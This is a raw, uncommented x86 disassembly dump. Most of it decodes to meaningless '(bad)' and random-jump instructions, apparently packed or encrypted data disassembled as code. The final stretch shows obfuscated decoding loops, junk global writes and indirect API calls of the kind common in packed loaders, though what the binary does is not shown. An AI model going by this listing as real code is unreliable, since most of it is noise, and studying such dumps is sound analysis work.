  41be2e:	arpl   WORD PTR [edx+0x68],ax
  41be31:	jecxz  0x41bdd8
  41be33:	(bad)  
  41be34:	retf   
  41be35:	fld    DWORD PTR [eax+0x11]
  41be38:	lods   eax,DWORD PTR ds:[esi]
  41be39:	mov    esp,0xeaebcf2e
  41be3e:	cmp    DWORD PTR [eax],ebx
  41be40:	xor    dh,BYTE PTR [edi]
  41be42:	jge    0x41bdf1
  41be44:	pushf  
  41be45:	mov    eax,0x9e23fe9e
  41be4a:	outs   dx,DWORD PTR ds:[esi]
  41be4b:	pop    edx
  41be4c:	repnz push eax
  41be4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be4f:	and    dl,BYTE PTR cs:[esi+0x206f8e79]
  41be56:	call   0x2b153bf0
  41be5b:	xchg   edx,eax
  41be5c:	dec    esp
  41be5d:	fmul   st(6),st
  41be5f:	mov    dl,0x3d
  41be61:	mov    bh,0x7c
  41be63:	inc    esi
  41be64:	push   ss
  41be65:	(bad)  
  41be66:	mov    al,ds:0xe09ee317
  41be6b:	fst    QWORD PTR [eax-0x5]
  41be6e:	add    DWORD PTR [ebp-0x37],ebp
  41be71:	loop   0x41be9a
  41be73:	shl    BYTE PTR ds:0xe1294eeb,1
  41be79:	dec    eax
  41be7a:	pop    ds
  41be7b:	or     al,0xc8
  41be7d:	ffree  st(2)
  41be7f:	jl     0x41be93
  41be81:	inc    edx
  41be82:	push   cs
  41be83:	pop    ds
  41be84:	and    BYTE PTR [edx+0x31],ah
  41be87:	rcl    dh,1
  41be89:	add    dl,bl
  41be8b:	or     eax,0x455f326d
  41be90:	inc    ecx
  41be91:	xchg   edi,eax
  41be92:	dec    eax
  41be93:	inc    esi
  41be94:	or     BYTE PTR [edx],0xba
  41be97:	fwait
  41be98:	push   esi
  41be99:	ds inc edi
  41be9b:	add    DWORD PTR [edi+0x6b],edi
  41be9e:	jl     0x41be7c
  41bea0:	inc    edx
  41bea1:	sub    al,ch
  41bea3:	xchg   esi,eax
  41bea4:	mov    ah,0xf2
  41bea6:	rol    ecx,1
  41bea8:	dec    edi
  41bea9:	fmul   QWORD PTR [ecx-0x30]
  41beac:	out    0xd7,eax
  41beae:	push   0xe38ec7ec
  41beb3:	mov    esi,0xb760cc7d
  41beb8:	xchg   bh,al
  41beba:	bound  ecx,QWORD PTR [esi+0x51f714ba]
  41bec0:	popa   
  41bec1:	arpl   WORD PTR [esi-0x64],ax
  41bec4:	pop    esp
  41bec5:	mov    ds:0x8f43acad,eax
  41beca:	jne    0x41bf19
  41becc:	jns    0x41bece
  41bece:	test   al,0x4f
  41bed0:	shr    DWORD PTR [ebx+esi*4+0x48],0x2b
  41bed5:	sbb    DWORD PTR [edi+edx*1],ebp
  41bed8:	sbb    eax,DWORD PTR [edx]
  41beda:	test   al,0xcc
  41bedc:	xor    DWORD PTR [eax],0x45f09008
  41bee2:	jmp    0x2ca6a95b
  41bee7:	int3   
  41bee8:	fisub  WORD PTR [edi+0x1dceba82]
  41beee:	gs inc eax
  41bef0:	xor    BYTE PTR [edi],dl
  41bef2:	pop    ecx
  41bef3:	pop    es
  41bef4:	xor    DWORD PTR [ecx+0x75],0xffffff83
  41bef8:	adc    esi,DWORD PTR es:0xfcbdec0
  41beff:	into   
  41bf00:	ins    BYTE PTR es:[edi],dx
  41bf01:	xchg   BYTE PTR [edi-0x33b8f26b],al
  41bf07:	mov    edi,0x62403e31
  41bf0c:	add    bl,BYTE PTR [ebx-0xcde47bf]
  41bf12:	sub    dl,BYTE PTR [esi-0x77]
  41bf15:	mov    DWORD PTR [ebx],eax
  41bf17:	ss push eax
  41bf19:	add    DWORD PTR [ebp+0x2375983],edx
  41bf1f:	jle    0x41bedf
  41bf21:	cmp    BYTE PTR [edx+0x5b],bh
  41bf24:	jl     0x41beaf
  41bf26:	les    ebx,FWORD PTR [ecx]
  41bf28:	pop    ds
  41bf29:	nop
  41bf2a:	xor    al,0xa3
  41bf2c:	xor    DWORD PTR [esi-0x62d13a46],esi
  41bf32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf33:	aam    0x1c
  41bf35:	and    ebx,DWORD PTR [ecx+0x54]
  41bf38:	xor    eax,0x56aee106
  41bf3d:	mov    DWORD PTR [edx],esi
  41bf3f:	call   0x341c1d2a
  41bf44:	sub    edi,DWORD PTR [edi+0x53]
  41bf47:	sub    ch,BYTE PTR [eax]
  41bf49:	inc    bh
  41bf4b:	jmp    0x41bf82
  41bf4d:	mov    dh,0x87
  41bf4f:	xor    al,0xc7
  41bf52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf53:	inc    eax
  41bf54:	mov    cs,WORD PTR [ebx+0x24a8dc26]
  41bf5a:	mov    eax,0xacb9b601
  41bf5f:	stos   DWORD PTR es:[edi],eax
  41bf60:	jl     0x41bf1e
  41bf62:	and    al,BYTE PTR [ecx-0x34]
  41bf65:	adc    cl,bl
  41bf67:	sbb    eax,0xa6c3c8de
  41bf6c:	repz jmp 0xe6be:0xebbd9e29
  41bf74:	dec    ebx
  41bf75:	mov    ds:0x420ebb4e,al
  41bf7a:	jg     0x41bf05
  41bf7c:	cmc    
  41bf7d:	jb     0x41bf6f
  41bf7f:	scas   eax,DWORD PTR es:[edi]
  41bf80:	mov    WORD PTR [eax],?
  41bf82:	sub    eax,0x69220647
  41bf87:	push   ss
  41bf88:	stos   DWORD PTR es:[edi],eax
  41bf89:	gs pop edi
  41bf8b:	(bad)  
  41bf8c:	retf   
  41bf8d:	xor    dl,BYTE PTR [ebx]
  41bf8f:	aad    0x62
  41bf91:	ins    BYTE PTR es:[edi],dx
  41bf92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf93:	retf   
  41bf94:	jmp    0x41bfaa
  41bf96:	fdiv   st(6),st
  41bf98:	and    bh,bl
  41bf9a:	call   0xecff:0x2b64c97a
  41bfa1:	fistp  DWORD PTR [eax-0xc]
  41bfa4:	adc    al,0x8b
  41bfa6:	and    dl,BYTE PTR [ebx-0x6ef88ee7]
  41bfac:	in     al,dx
  41bfad:	iret   
  41bfae:	cwde   
  41bfaf:	lods   al,BYTE PTR ds:[esi]
  41bfb0:	mov    edi,0x118dd909
  41bfb5:	out    dx,eax
  41bfb6:	(bad)  
  41bfb7:	out    0x5,eax
  41bfb9:	jmp    0x41c021
  41bfbb:	xor    dl,BYTE PTR [ecx+0x44deccd1]
  41bfc1:	pop    es
  41bfc2:	test   BYTE PTR [ebx+0x9],al
  41bfc5:	mov    dh,BYTE PTR [ecx+ebp*8-0x37]
  41bfc9:	out    0xe1,eax
  41bfcb:	sub    BYTE PTR [eax-0x4a767601],dh
  41bfd1:	push   ebx
  41bfd2:	mov    ds:0x2269b5cd,eax
  41bfd7:	iret   
  41bfd8:	jb     0x41bf79
  41bfda:	mov    esp,0x92bc13d8
  41bfdf:	inc    esi
  41bfe0:	call   0x52285320
  41bfe5:	dec    ebp
  41bfe6:	or     BYTE PTR [ebp+0x739d1488],bl
  41bfec:	push   ebp
  41bfed:	(bad)  
  41bfee:	cmp    ebx,ecx
  41bff0:	sub    eax,0x811c3e93
  41bff5:	inc    edx
  41bff6:	pop    edi
  41bff7:	sbb    eax,0x8fa64b26
  41bffc:	mov    ecx,0xd4d29458
  41c001:	add    eax,0xbb1d6d81
  41c006:	aam    0x5a
  41c008:	inc    edi
  41c009:	mov    esp,0xa7cea5cc
  41c00e:	enter  0x76b0,0x5e
  41c012:	cmp    BYTE PTR [ebp+esi*2-0x3aa3f675],dh
  41c019:	jae    0x41c090
  41c01b:	cmp    esi,DWORD PTR [edx]
  41c01d:	call   DWORD PTR [ebx-0x55]
  41c020:	jecxz  0x41c067
  41c022:	cmp    eax,0x37069050
  41c027:	test   DWORD PTR [esp+esi*4+0x5ec3b5be],ecx
  41c02e:	add    ebx,DWORD PTR [ebx]
  41c030:	mov    edi,DWORD PTR [esp+ecx*1]
  41c033:	mov    ebx,0xbd6dfe56
  41c038:	jb     0x41c0b7
  41c03a:	xor    DWORD PTR [edi-0x7e],edi
  41c03d:	stos   DWORD PTR es:[edi],eax
  41c03e:	int    0x97
  41c040:	rol    BYTE PTR [edx+0x4d8b89c6],cl
  41c046:	pop    ebp
  41c047:	retf   0xea09
  41c04a:	fnstsw WORD PTR [edx]
  41c04c:	push   edx
  41c04d:	dec    DWORD PTR [eax]
  41c04f:	sbb    al,0xda
  41c051:	std    
  41c052:	xchg   ecx,eax
  41c053:	jno    0x41c04d
  41c055:	mov    ebx,0x69577cf5
  41c05a:	pop    ds
  41c05b:	imul   esp,DWORD PTR [ecx+0x44],0xfffffffd
  41c05f:	rcr    BYTE PTR [ecx],cl
  41c061:	shl    DWORD PTR ds:0x6444400c,cl
  41c067:	test   BYTE PTR [ebx-0x57d95987],0xfc
  41c06e:	int3   
  41c06f:	int3   
  41c070:	jno    0x41c036
  41c072:	gs pop ds
  41c074:	add    BYTE PTR [eax+0x1a],ah
  41c077:	inc    ebp
  41c078:	xchg   esp,eax
  41c079:	cmp    esi,DWORD PTR [esi]
  41c07b:	mov    eax,ds:0x2d539841
  41c080:	pop    esp
  41c081:	stos   DWORD PTR es:[edi],eax
  41c082:	sbb    BYTE PTR [ebp+0x8],cl
  41c085:	push   ds
  41c086:	in     al,dx
  41c087:	mov    edx,0x6fa17306
  41c08c:	ss in  al,0x57
  41c08f:	adc    DWORD PTR [esi-0x35],ebp
  41c092:	imul   ecx,DWORD PTR [edx+ebp*8],0xffffffe8
  41c096:	lock bound ebp,QWORD PTR [edx+0x711a4a0e]
  41c09d:	(bad)  
  41c09e:	cmp    eax,0xcc103293
  41c0a3:	loopne 0x41c0db
  41c0a5:	daa    
  41c0a6:	cmc    
  41c0a7:	dec    edx
  41c0a8:	jle    0x41c11f
  41c0aa:	sbb    eax,0x67558f12
  41c0af:	enter  0x3f68,0x82
  41c0b3:	loopne 0x41c067
  41c0b5:	push   cs
  41c0b6:	adc    BYTE PTR [ecx],cl
  41c0b8:	inc    esp
  41c0b9:	mov    ah,0x20
  41c0bb:	shl    ah,0x4a
  41c0be:	jmp    0xbd43e514
  41c0c3:	dec    esi
  41c0c4:	lods   eax,DWORD PTR ds:[esi]
  41c0c5:	retf   0xb9df
  41c0c8:	and    al,0xd5
  41c0ca:	jno    0x41c103
  41c0cc:	dec    ebp
  41c0cd:	clc    
  41c0ce:	out    0x42,eax
  41c0d0:	fdivr  DWORD PTR [ebx-0x1e301ef8]
  41c0d6:	(bad)  
  41c0d7:	push   eax
  41c0d8:	mov    ds:0x5470c478,eax
  41c0dd:	dec    esi
  41c0de:	ffree  st(7)
  41c0e0:	or     eax,0xbd21b2d9
  41c0e5:	rol    ah,cl
  41c0e7:	xchg   edi,eax
  41c0e8:	sar    BYTE PTR [edi+0x68207a41],0x1d
  41c0ef:	fs cmp al,0xdb
  41c0f2:	loop   0x41c12b
  41c0f4:	aaa    
  41c0f5:	jmp    0x8649d5ac
  41c0fa:	lock sbb ebp,esi
  41c0fd:	xor    edx,DWORD PTR [eax+0x1c]
  41c100:	inc    ebx
  41c101:	aas    
  41c102:	popf   
  41c103:	sub    BYTE PTR [edx],0xc4
  41c106:	into   
  41c107:	and    ebx,0xc
  41c10a:	push   ebp
  41c10b:	push   ecx
  41c10c:	sti    
  41c10d:	pop    esi
  41c10e:	(bad)  
  41c110:	or     DWORD PTR [esp+esi*2+0x3],0x3a
  41c115:	pop    ebx
  41c116:	mov    edx,DWORD PTR [edx]
  41c118:	sbb    ecx,0xffffff93
  41c11b:	and    DWORD PTR [edx],edi
  41c11d:	(bad)  
  41c11e:	jp     0x41c0d3
  41c120:	sub    eax,0x401af8c7
  41c125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c126:	fs add eax,0x2ae3a577
  41c12c:	cmp    esp,DWORD PTR [edi+eax*2-0x4e6b7e65]
  41c133:	xor    DWORD PTR [edx+0x5],esi
  41c136:	aam    0xf3
  41c138:	xchg   ecx,eax
  41c139:	rcr    BYTE PTR [eax+0x57674b7b],cl
  41c13f:	daa    
  41c140:	xchg   edi,eax
  41c141:	adc    dl,bh
  41c143:	xor    ebx,DWORD PTR [edx+0x6a5fd98]
  41c149:	fiadd  DWORD PTR [ebx+0x54]
  41c14c:	and    al,cl
  41c14e:	out    0xd,al
  41c150:	std    
  41c151:	sbb    DWORD PTR [ecx+ebp*8+0x2f8e3555],ebp
  41c158:	(bad)  
  41c159:	xor    DWORD PTR [edx+0x17],edi
  41c15c:	mov    esi,DWORD PTR [ecx-0x3e]
  41c15f:	adc    esp,DWORD PTR [eax+edi*1]
  41c162:	adc    esi,edi
  41c164:	iret   
  41c165:	(bad)  [edi]
  41c167:	jnp    0x41c1d1
  41c169:	fs jo  0x41c18e
  41c16c:	mov    al,ds:0xe6b08606
  41c171:	cmc    
  41c172:	sbb    bl,BYTE PTR [eax-0x42]
  41c175:	mov    cl,ch
  41c177:	and    esp,DWORD PTR [edi+0x7480fa51]
  41c17d:	hlt    
  41c17e:	sbb    dl,0x27
  41c181:	and    DWORD PTR [edx+0x33],eax
  41c184:	fidiv  WORD PTR [esi]
  41c186:	mov    edx,0x872ffec2
  41c18b:	push   ds
  41c18c:	dec    esp
  41c18d:	aaa    
  41c18e:	pop    edx
  41c18f:	dec    edi
  41c190:	xchg   esp,eax
  41c191:	mov    fs,edi
  41c193:	push   esi
  41c194:	in     al,dx
  41c195:	mov    bl,0x5b
  41c197:	call   0x38e1d948
  41c19c:	(bad)  
  41c19d:	xchg   edx,eax
  41c19e:	fisubr DWORD PTR [ecx+0x3c]
  41c1a1:	adc    eax,0x9cca26a1
  41c1a6:	les    esp,FWORD PTR [esi]
  41c1a8:	dec    ecx
  41c1a9:	push   ecx
  41c1aa:	push   ss
  41c1ab:	xchg   esp,eax
  41c1ac:	(bad)  
  41c1ad:	out    dx,eax
  41c1ae:	xchg   esp,eax
  41c1af:	retf   
  41c1b0:	add    DWORD PTR [ecx-0x12ae68ab],eax
  41c1b6:	cmp    esp,DWORD PTR [ecx+0x1e]
  41c1b9:	dec    ebp
  41c1ba:	jo     0x41c1ea
  41c1bc:	sbb    al,0x71
  41c1be:	sbb    DWORD PTR [esi+edx*4],ecx
  41c1c1:	add    DWORD PTR [ebx-0x36968053],0xace488a7
  41c1cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1cc:	push   0xffffffa0
  41c1ce:	pop    eax
  41c1cf:	jp     0x41c1fa
  41c1d1:	dec    eax
  41c1d2:	shr    DWORD PTR [eax-0x3c],cl
  41c1d5:	lods   al,BYTE PTR ds:[esi]
  41c1d6:	pop    edx
  41c1d7:	mov    dh,0x35
  41c1d9:	jno    0x41c1dd
  41c1db:	iret   
  41c1dc:	jmp    0x41c18c
  41c1de:	xor    DWORD PTR [ebp+0x7f],ecx
  41c1e1:	fdivr  DWORD PTR [ebp+eiz*2+0x31a8e73]
  41c1e8:	adc    cl,BYTE PTR [esp+edi*4]
  41c1eb:	shl    cl,cl
  41c1ed:	add    eax,0x9b9514ef
  41c1f2:	(bad)  
  41c1f3:	xlat   BYTE PTR ds:[ebx]
  41c1f4:	test   al,0x33
  41c1f6:	rcl    DWORD PTR [eax-0x31],1
  41c1f9:	inc    edx
  41c1fa:	inc    ecx
  41c1fb:	(bad)  
  41c1fc:	iret   
  41c1fd:	sub    eax,0xf0764f76
  41c202:	gs mov esi,0x2a543875
  41c208:	dec    esp
  41c209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c20a:	test   DWORD PTR [eax],esi
  41c20c:	add    eax,0x3ec83116
  41c211:	mov    ebp,0xe2523c6d
  41c216:	dec    esi
  41c217:	dec    esp
  41c218:	dec    esi
  41c219:	xchg   esp,eax
  41c21a:	fcom   DWORD PTR [eax+0x41]
  41c21d:	outs   dx,DWORD PTR ds:[esi]
  41c21e:	inc    ecx
  41c21f:	and    eax,0x44c649e7
  41c224:	xchg   esi,eax
  41c225:	push   es
  41c226:	shl    BYTE PTR [edi+esi*2-0x246f9075],1
  41c22d:	cdq    
  41c22e:	retf   0x1af2
  41c231:	sub    DWORD PTR [esi+0x9],0xffffffbc
  41c235:	jmp    0x41c263
  41c237:	sti    
  41c238:	xor    DWORD PTR [eax+0x4f9ddde9],0x5b
  41c23f:	leave  
  41c240:	sbb    ecx,DWORD PTR [ecx+0x64f95d50]
  41c246:	pop    ecx
  41c247:	je     0x41c258
  41c249:	rol    BYTE PTR [ebp-0x60c2ff8f],0x5
  41c250:	int3   
  41c251:	xchg   ebp,eax
  41c252:	daa    
  41c253:	dec    esi
  41c254:	inc    ebx
  41c255:	and    al,0xa2
  41c257:	or     ecx,0xa31f912a
  41c25d:	cs popf 
  41c25f:	or     edx,esi
  41c261:	dec    ebx
  41c262:	push   0xbd256291
  41c267:	and    BYTE PTR [ecx+0x54303219],0x81
  41c26e:	stos   BYTE PTR es:[edi],al
  41c26f:	cmc    
  41c270:	mov    al,0x95
  41c272:	daa    
  41c273:	scas   eax,DWORD PTR es:[edi]
  41c274:	jle    0x41c222
  41c276:	xchg   ebp,eax
  41c277:	push   ss
  41c278:	cdq    
  41c279:	add    al,0x49
  41c27b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27c:	bound  ecx,QWORD PTR [ebx]
  41c27e:	jmp    0x33fe55da
  41c283:	bound  edi,QWORD PTR [ebp-0x57]
  41c286:	fild   WORD PTR [ebx-0x18]
  41c289:	jmp    0xc610:0x77f57006
  41c290:	add    BYTE PTR [eax+0x2960ebee],ah
  41c296:	xor    al,dh
  41c298:	retf   0x9992
  41c29b:	gs jl  0x41c2ec
  41c29e:	jb     0x41c254
  41c2a0:	xchg   ebp,eax
  41c2a1:	adc    al,0xfc
  41c2a3:	pop    ebx
  41c2a4:	loopne 0x41c2f2
  41c2a6:	cmc    
  41c2a7:	xchg   edx,eax
  41c2a8:	clc    
  41c2a9:	mov    esp,0xcf78c048
  41c2ae:	sbb    al,0x7b
  41c2b0:	mov    al,0xea
  41c2b2:	mov    dl,0xad
  41c2b4:	or     DWORD PTR [ebx+ecx*2],ebx
  41c2b7:	daa    
  41c2b8:	pop    eax
  41c2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2ba:	sbb    ah,BYTE PTR [ecx+0xa]
  41c2bd:	mov    cl,0x37
  41c2bf:	mov    bl,0xdb
  41c2c1:	mov    bl,0x7f
  41c2c3:	repz dec esi
  41c2c5:	add    eax,0x85d929ed
  41c2ca:	pop    ecx
  41c2cb:	(bad)  
  41c2cc:	jbe    0x41c29f
  41c2ce:	ss cli 
  41c2d0:	and    bh,BYTE PTR [ecx+0x483e8111]
  41c2d6:	xor    BYTE PTR [ebx-0x27],dh
  41c2d9:	xchg   esp,eax
  41c2da:	(bad)  
  41c2db:	jmp    0xf0eb:0x4224d188
  41c2e2:	leave  
  41c2e3:	sbb    dl,BYTE PTR [esi-0x2c]
  41c2e6:	daa    
  41c2e7:	push   cs
  41c2e8:	mov    eax,ds:0xfc64983c
  41c2ed:	pop    eax
  41c2ee:	adc    eax,0x545f4fb7
  41c2f3:	fsub   QWORD PTR [edx+0x6]
  41c2f6:	xor    ch,BYTE PTR [ecx+0x5b]
  41c2f9:	ja     0x41c353
  41c2fb:	loop   0x41c374
  41c2fd:	push   ecx
  41c2fe:	out    dx,al
  41c2ff:	pop    ebx
  41c300:	add    esp,DWORD PTR [ebx]
  41c302:	jb     0x41c369
  41c304:	xchg   edx,eax
  41c305:	loopne 0x41c2b9
  41c307:	mov    WORD PTR [esi+0x1c],gs
  41c30a:	push   es
  41c30b:	loop   0x41c311
  41c30d:	sahf   
  41c30e:	jo     0x41c344
  41c310:	xor    al,0x5
  41c312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c313:	pop    esi
  41c314:	push   ss
  41c315:	ret    0xbe08
  41c318:	jae    0x41c31f
  41c31a:	in     al,0xa0
  41c31c:	inc    edi
  41c31d:	pushf  
  41c31e:	(bad)  
  41c31f:	adc    BYTE PTR [esi+ebp*8-0x6c],cl
  41c323:	xchg   ebp,eax
  41c324:	xchg   ebx,eax
  41c325:	sbb    bl,dl
  41c327:	lea    ebx,[eax+ebx*8+0x73a370a6]
  41c32e:	test   al,0xf9
  41c330:	push   0x200c7af5
  41c335:	mov    al,0xe7
  41c337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c338:	dec    esp
  41c339:	ret    
  41c33a:	mov    ds,WORD PTR ds:[esi-0x43]
  41c33e:	out    0x4d,eax
  41c340:	pop    ss
  41c341:	jmp    0x9ea493cc
  41c346:	sbb    bh,BYTE PTR [edx+ebp*4]
  41c349:	push   ss
  41c34a:	fs jne 0x41c33f
  41c34d:	mov    BYTE PTR [ecx],cl
  41c34f:	ds pop edx
  41c351:	sub    DWORD PTR [edi+0x6498f86],esi
  41c357:	inc    ecx
  41c358:	jno    0x41c314
  41c35a:	out    0xff,eax
  41c35c:	push   si
  41c35e:	push   ebp
  41c35f:	shr    BYTE PTR [ecx-0x5e247370],cl
  41c365:	dec    edx
  41c366:	mov    ds:0x39a956d0,eax
  41c36b:	add    edi,DWORD PTR [ecx]
  41c36d:	idiv   BYTE PTR [edi]
  41c36f:	mov    eax,ds:0x11d54094
  41c374:	mov    edi,0x283d93fb
  41c379:	call   0x1155:0xb68d7e3a
  41c380:	pop    esi
  41c381:	jle    0x41c350
  41c383:	ss xchg edx,eax
  41c385:	and    ebp,DWORD PTR [ebx-0x5c371d7d]
  41c38b:	adc    bh,bl
  41c38d:	(bad)
  41c391:	push   0xf28addde
  41c396:	inc    esp
  41c397:	push   ebx
  41c398:	dec    esp
  41c399:	lds    ebp,FWORD PTR [eax+0x69e9af07]
  41c39f:	fmul   DWORD PTR [esi-0x2ee34859]
  41c3a5:	pop    ecx
  41c3a6:	lea    eax,[edi-0x57c9e431]
  41c3ac:	mov    cl,0x48
  41c3ae:	sbb    ebx,DWORD PTR [ecx+edx*8]
  41c3b1:	arpl   WORD PTR [ecx-0x46],sp
  41c3b4:	sbb    al,0xa5
  41c3b6:	jno    0x41c3da
  41c3b8:	cli    
  41c3b9:	shl    DWORD PTR [esp+ebp*1+0x29b1418e],cl
  41c3c0:	jecxz  0x41c35c
  41c3c2:	ror    DWORD PTR [esi+0x70],0xd9
  41c3c6:	adc    edi,DWORD PTR ss:[edi-0x47]
  41c3ca:	test   DWORD PTR [edx+0x1d810000],ecx
  41c3d0:	or     al,0xc0
  41c3d2:	inc    edx
  41c3d3:	add    BYTE PTR [eax+eiz*4],bl
  41c3d6:	inc    edx
  41c3d7:	add    BYTE PTR [esi+0x33],ah
  41c3da:	dec    esp
  41c3db:	xchg   edi,eax
  41c3dc:	add    al,BYTE PTR [ecx+0x42800425]
  41c3e2:	add    BYTE PTR [edx+0x29],bh
  41c3e5:	add    BYTE PTR [eax],al
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c490:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c497:	mov    DWORD PTR ds:0x42a000,0x393
  41c4a1:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c4a8:	movzx  ecx,WORD PTR ds:0x42a008
  41c4af:	mov    ecx,DWORD PTR [ebp-0xc]
  41c4b2:	mov    DWORD PTR [ebp+0x8],ecx
  41c4b5:	jmp    0x41c6f7
  41c4ba:	mov    ecx,DWORD PTR ds:0x428024
  41c4c0:	add    DWORD PTR ds:0x429008,ecx
  41c4c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4c9:	sbb    edx,DWORD PTR ds:0x429018
  41c4cf:	mov    edx,DWORD PTR [ebp-0x8]
  41c4d2:	or     DWORD PTR ds:0x429010,0x42a010
  41c4dc:	xor    ecx,eax
  41c4de:	xor    edx,eax
  41c4e0:	adc    DWORD PTR ds:0x42a014,0x429000
  41c4ea:	sub    ecx,edx
  41c4ec:	adc    edx,DWORD PTR ds:0x42b010
  41c4f2:	sub    ecx,esi
  41c4f4:	mov    DWORD PTR ds:0x428018,0x60a2
  41c4fe:	xor    ecx,eax
  41c500:	mov    DWORD PTR [ebp+0x8],ecx
  41c503:	and    ecx,0x319e
  41c509:	mov    ecx,DWORD PTR [ebp+0x8]
  41c50c:	or     edx,DWORD PTR ds:0x428008
  41c512:	mov    edx,DWORD PTR [ebp-0x64]
  41c515:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c51c:	mov    DWORD PTR [ebp-0x64],ecx
  41c51f:	or     DWORD PTR ds:0x42901c,0xdce
  41c529:	mov    ecx,DWORD PTR [ebp+0x8]
  41c52c:	movzx  edx,BYTE PTR ds:0x429000
  41c533:	xor    DWORD PTR ds:0x42c004,edx
  41c539:	mov    edx,DWORD PTR [ebp-0x60]
  41c53c:	lea    ecx,[edx+ecx*1+0x5708f5]
  41c543:	not    edx
  41c545:	mov    DWORD PTR [ebp-0x60],ecx
  41c548:	xor    ecx,ecx
  41c54a:	or     ecx,DWORD PTR ds:0x428008
  41c550:	adc    ecx,DWORD PTR ds:0x42901c
  41c556:	mov    DWORD PTR ds:0x428008,ecx
  41c55c:	mov    ecx,DWORD PTR [ebp+0x8]
  41c55f:	and    DWORD PTR ds:0x42b018,0x0
  41c569:	mov    edx,DWORD PTR ds:0x42b018
  41c56f:	inc    edx
  41c570:	mov    DWORD PTR ds:0x42b018,edx
  41c576:	cmp    DWORD PTR ds:0x42b018,0x1b
  41c57d:	jne    0x41c5ad
  41c583:	push   0x42c004
  41c588:	push   0x28d8
  41c58d:	push   0x39eb
  41c592:	push   0x42801c
  41c597:	push   0x11e7
  41c59c:	push   0x42351e
  41c5a1:	push   DWORD PTR [ebp-0x1c]
  41c5a4:	push   DWORD PTR [ebp-0x1c]
  41c5a7:	call   DWORD PTR ds:0x424024
  41c5ad:	cmp    DWORD PTR ds:0x42b018,0x17
  41c5b4:	jb     0x41c569
  41c5ba:	or     DWORD PTR ds:0x42a018,0x7d26
  41c5c4:	mov    edx,DWORD PTR [ebp-0x5c]
  41c5c7:	sbb    DWORD PTR ds:0x42c008,0x428018
  41c5d1:	lea    ecx,[edx+ecx*1+0x5708f4]
  41c5d8:	and    DWORD PTR ds:0x42c00c,edx
  41c5de:	mov    DWORD PTR [ebp-0x5c],ecx
  41c5e1:	and    edx,0x6d7b
  41c5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ea:	mov    edx,DWORD PTR [ebp-0x58]
  41c5ed:	mov    DWORD PTR ds:0x428028,0xea2
  41c5f7:	lea    ecx,[edx+ecx*1+0x5708fb]
  41c5fe:	mov    DWORD PTR [ebp-0x58],ecx
  41c601:	mov    DWORD PTR ds:0x429010,0x14
  41c60b:	cmp    DWORD PTR ds:0x429010,0x0
  41c612:	je     0x41c6a5
  41c618:	cmp    DWORD PTR ds:0x429010,0x4
  41c61f:	jne    0x41c636
  41c625:	push   0x3e6d
  41c62a:	push   DWORD PTR [ebp-0x28]
  41c62d:	push   DWORD PTR [ebp-0x10]
  41c630:	call   DWORD PTR ds:0x424028
  41c636:	cmp    DWORD PTR ds:0x429010,0x5
  41c63d:	jne    0x41c652
  41c643:	xor    edx,edx
  41c645:	add    edx,DWORD PTR ds:0x429010
  41c64b:	dec    edx
  41c64c:	mov    DWORD PTR ds:0x429010,edx
  41c652:	mov    edx,DWORD PTR ds:0x429010
  41c658:	dec    edx
  41c659:	mov    DWORD PTR ds:0x429010,edx
  41c65f:	jmp    0x41c60b
  41c664:	and    DWORD PTR ds:0x428018,0x0
  41c66e:	mov    edx,DWORD PTR ds:0x428018
  41c674:	inc    edx
  41c675:	mov    DWORD PTR ds:0x428018,edx
  41c67b:	cmp    DWORD PTR ds:0x428018,0x20
  41c682:	jne    0x41c698
  41c688:	push   0x42362d
  41c68d:	push   0x423644
  41c692:	call   DWORD PTR ds:0x424030
  41c698:	cmp    DWORD PTR ds:0x428018,0x19
  41c69f:	jb     0x41c66e
  41c6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c6a8:	mov    edx,DWORD PTR [ebp-0x54]
